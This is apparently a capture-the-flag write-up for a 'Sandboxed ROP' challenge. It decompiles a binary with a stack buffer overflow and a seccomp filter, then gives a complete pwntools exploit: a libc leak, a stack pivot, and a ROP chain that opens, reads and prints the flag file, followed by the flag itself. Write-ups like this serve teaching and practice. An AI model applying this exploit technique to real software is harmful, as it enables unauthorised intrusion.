## Sandboxed ROP (445 points)

### Description

Chain of Fools Chain, keep us together. Running in the shadow.  
Flag is in /pwn/flag.txt

nc challenges.ctfd.io 30018

running on ubuntu 20.04

### Gathering information

We can decompile the binary using Ghidra.  
The main function looks like this:

```c  
undefined8 main(EVP_PKEY_CTX *param_1)

{  
 undefined buffer [16];  
  
 init(param_1);  
 init_seccomp();  
 puts("pwn dis shit");  
 read(0,buffer,0x200);  
 return 0;  
}  
```

We can already notice the buffer overflow. This time, though, there's a catch.

The `init_seccomp()` function has included some seccomp rules. These are
basically rules that are placed in the program to make it behave in some
secure way. Check the manual for more informations.

The decompiled function looks like this:

```c  
void init_seccomp(void)

{  
 undefined8 seccomp_filter;  
  
 seccomp_filter = seccomp_init(0);  
 seccomp_rule_add(seccomp_filter,0x7fff0000,2,0);  
 seccomp_rule_add(seccomp_filter,0x7fff0000,0,0);  
 seccomp_rule_add(seccomp_filter,0x7fff0000,1,0);  
 seccomp_rule_add(seccomp_filter,0x7fff0000,0xe7,0);  
 seccomp_rule_add(seccomp_filter,0x7fff0000,0x101,0);  
 seccomp_load(seccomp_filter);  
 return;  
}

```

This function is initializing and loading a seccomp filter that basically
forbids every syscall but the read, write, open, exit_group and openat ones.

Hence, we need to develop an exploit using these syscall only.

### Exploitation

The main idea of the exploit is to:

- Leak libc in order to be able to call `open` (we are missing a sycall instruction!)  
- Write `/pwn/flag.txt` to memory and call `open` with it  
- Read from the opened file descriptor, then output what we've read

We've developed a small POC before trying to exploit this, in order to make
sure that the idea would have worker:

```c  
#include <stdio.h>  
#include <seccomp.h>  
#include <unistd.h>  
#include <sys/stat.h>  
#include <fcntl.h>

int main(){  
  
   scmp_filter_ctx uVar1 = seccomp_init(0), uVar2;  
   seccomp_rule_add(uVar1,0x7fff0000,2,0);  
   seccomp_rule_add(uVar1,0x7fff0000,0,0);  
   seccomp_rule_add(uVar1,0x7fff0000,1,0);  
   seccomp_rule_add(uVar1,0x7fff0000,0xe7,0);  
   seccomp_rule_add(uVar1,0x7fff0000,0x101,0);  
   seccomp_load(uVar1);  
  
   int fd = open("./flag.txt",O_RDONLY);  
   if(fd == -1){  
       write(1, "Did you create the flag.txt file?\n", 34);  
   }

   char buff[20] = {0};  
   read(fd, buff, 20);  
   write(1, buff, 20);  
}  
```

Compiling it with gcc (the `-lseccomp` flag was needed) and executing printed
out our fake flag, so we were good to go!

```python  
#!/usr/bin/env python3

from pwn import *

HOST = 'challenges.ctfd.io'  
PORT = 30018

exe = ELF('./chal.out')  
rop = ROP(exe)

context.binary = exe  
context.log_level = 'debug'

def conn():  
   if args.LOCAL:  
       libc = ELF('/usr/lib/libc-2.33.so', checksec = False)  
       return process([exe.path]), libc, './flag.txt'  
   else:  
       libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so', checksec = False)  
       return remote(HOST, PORT), libc, '/pwn/flag.txt'

def create_rop(ropchain):  
   buff_len = 0x16  
   payload  = b'A' * buff_len  
   payload += b'B' * 2  
   payload += ropchain

   return payload

def main():  
   io, libc, flag = conn()

   # good luck pwning :)

   # ---------------------------------------------------- #  
   # ---------------------- gadgets --------------------- #  
   # ---------------------------------------------------- #  
   pop_rsp = 0x000000000040139d # pop rsp; pop r13; pop r14; pop r15; ret;  
   pop_rdi = 0x00000000004013a3 # pop rdi; ret;  
   pop_rsi = 0x00000000004013a1 # pop rsi; pop r15; ret;  
   pop_rdx = 0x00000000004011de # pop rdx; ret;

   pwn_dis_shit_ptr = 0x00402004 # 'pwn dis shit'

   # ---------------------------------------------------- #  
   # ------------------- leaking libc ------------------- #  
   # ---------------------------------------------------- #  
   rop = ROP(exe)  
   leak_func = 'read'

   # Note: we MUST leak libc because we do NOT have any 'syscall' instruction!

   # We can use the bss segment to read/write another ropchain.  
   # We need to write another ropchain because we do not know,  
   # at the time of sending this rop, the base of libc.  
   other_ropchain_addr = exe.bss(100)

   # Leak reading with puts the GOT of a function  
   rop.puts(exe.got[leak_func])  
   rop.puts(pwn_dis_shit_ptr) # used as a marker to send the second ropchain

   # Read the second ropchain into memory at the specified address  
   rop.read(0, other_ropchain_addr, 0x1000)

   # PIVOT the stack into the second ropchain  
   # We are popping the RSP register, effectively moving our stack  
   # to the specified popped address. The program will keep executing  
   # normally, but the stack will be at our chosen position  
   rop.raw(pop_rsp)  
   rop.raw(other_ropchain_addr)  
  
   # Just a little debugging trick for ropchains  
log.info('# ================ ROP 1 ================= #')  
log.info(rop.dump())

   # Send the payload  
   payload = create_rop(rop.chain())  
   io.sendlineafter('pwn dis shit', payload)  
  
   # Get the libc leak. We again use https://libc.blukat.me  
   # to find the correct libc version used on the server  
   libc_leak = u64(io.recvuntil('\x7f')[1:].ljust(8, b'\x00'))  
log.info(f'{leak_func} @ {hex(libc_leak)}')  
   libc.address = libc_leak - libc.symbols[leak_func]  
log.info(f'libc base @ {hex(libc.address)}')  
  
   # Some useful gadgets from libc  
   mov_ptrrdx_eax = libc.address + 0x00000000000374b1 # mov dword ptr [rdx],
eax; ret;  
   syscall_ret = libc.address + 0x0000000000066229 # syscall; ret;

   # ---------------------------------------------------- #  
   # -------------- open('/pwn/flag.txt') --------------- #  
   # ------------- read(flagfd, mem, len) --------------- #  
   # ------------- write(stdout, mem, len) -------------- #  
   # ---------------------------------------------------- #

   rop = ROP(exe)

   strings_addr = exe.bss(400) # a place far enough from our ropchain

   # 3 POPs to adjust previous stack pivoting  
   # The pop_rsp gadget was also popping other 3 registers!  
   rop.raw(0)  
   rop.raw(0)  
   rop.raw(0)

   # Read the '/pwn/flag.txt' string from stdin  
   rop.read(0, strings_addr, len(flag))

   # Execute the open('/pwn/flag.txt') libc function (this is why we needed
libc btw)  
   rop.raw(pop_rdi)  
   rop.raw(strings_addr)  
   rop.raw(pop_rsi)  
   rop.raw(0x000) # O_RDONLY  
   rop.raw(0) # pop_rsi pops 2 registers!  
   rop.raw(libc.symbols['open'])

   # The followings instructions were used to check if the file descriptor  
   # from whom we were trying to read was correct. We also determined this by  
   # debugging the exploit with gdb in an ubuntu 20.04 container (which was
the  
   # one used in the challenge, as the description reported).  
   #  
   # We determined that the correct fd was 5  
   #  
   # rop.raw(pop_rdx)  
   # rop.raw(exe.bss(600))  
   # rop.raw(mov_ptrrdx_eax)  
   # rop.puts(exe.bss(600))

   # Read into our address the flag...  
   rop.read(5, strings_addr, 50)

   # ...and then print it out  
   rop.puts(exe.bss(400))  
  
log.info('# ================ ROP 2 ================= #')  
log.info(rop.dump())

   # Send second ropchain  
   io.sendlineafter('pwn dis shit', rop.chain())

   # Send the flag filename ('/pwn/flag.txt' on the server)  
   io.send(flag)  
  
   # Profit  
   log.success(f'Flag: {io.recvall().decode().strip()}')

if __name__ == '__main__':  
   main()

```

### The Flag

The flag was `UDCTF{R0PEN_RE@D_WR!T3_right??}`

### Conclusion

Indeed a fun and instructive challenge. That's the first time I've seen this
`seccomp` stuff!